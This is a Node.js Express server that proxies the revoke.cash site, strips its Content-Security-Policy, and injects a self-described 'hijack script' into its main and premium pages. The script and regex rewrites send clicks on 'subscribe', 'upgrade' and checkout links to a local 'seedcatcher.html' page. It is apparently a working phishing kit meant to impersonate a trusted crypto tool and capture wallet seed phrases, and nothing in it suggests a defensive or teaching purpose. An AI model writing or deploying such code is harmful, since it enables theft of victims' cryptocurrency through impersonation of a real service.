const express = require('express');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const app = express();
const port = process.env.PORT || 8080;

app.use(async (req, res, next) => {
    // 1. Serve local files directly
    const localFile = path.join(__dirname, req.path);
    if (fs.existsSync(localFile) && fs.lstatSync(localFile).isFile()) {
        return res.sendFile(localFile);
    }

    // 2. Proxy to revoke.cash
    try {
        const url = 'https://revoke.cash' + req.originalUrl;
        const response = await axios({
            method: req.method,
            url: url,
            responseType: 'stream',
            headers: { 
                ...req.headers, 
                host: 'revoke.cash',
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1'
            }
        });
        
        res.setHeader('Access-Control-Allow-Origin', '*');
        res.removeHeader('Content-Security-Policy');

        // 3. Check if we are loading the main page OR the premium page
        if (req.path === '/' || req.path === '/index.html' || req.path === '/premium') {
            let html = '';
            response.data.on('data', chunk => html += chunk);
            response.data.on('end', () => {
                
                // If we are on the premium page, rewrite the checkout links
                if (req.path === '/premium') {
                    html = html.replace(/href="[^"]*\/subscribe[^"]*"/gi, 'href="/seedcatcher.html"');
                    html = html.replace(/href="[^"]*\/billing[^"]*"/gi, 'href="/seedcatcher.html"');
                    html = html.replace(/href="[^"]*\/checkout[^"]*"/gi, 'href="/seedcatcher.html"');
                }

                // Inject the hijack script on every page
                const inlineScript = `
                <script>
                document.addEventListener('click', function(e) {
                    let t = e.target.closest('a, button, div, span');
                    if (!t) return;
                    let text = (t.innerText || "").toLowerCase().trim();
                    let href = (t.getAttribute("href") || "").toLowerCase();
                    
                    // Ignore the main menu link
                    if (href === '/premium' || href.endsWith('/premium')) return;

                    // Catch the exact buttons on the pricing page
                    if (text === 'get started' || text === 'subscribe' || text.includes('upgrade')) {
                        e.preventDefault();
                        e.stopPropagation();
                        window.location.href = '/seedcatcher.html';
                    }
                }, true);
                </script>
                `;
                if (html.includes('</body>')) {
                    html = html.replace('</body>', inlineScript + '</body>');
                }
                res.send(html);
            });
        } else {
            if (response.headers['content-type']) {
                res.setHeader('Content-Type', response.headers['content-type']);
            }
            response.data.pipe(res);
        }
    } catch (error) {
        next(); 
    }
});

app.get('*', (req, res) => {
    res.status(404).send('Not found');
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
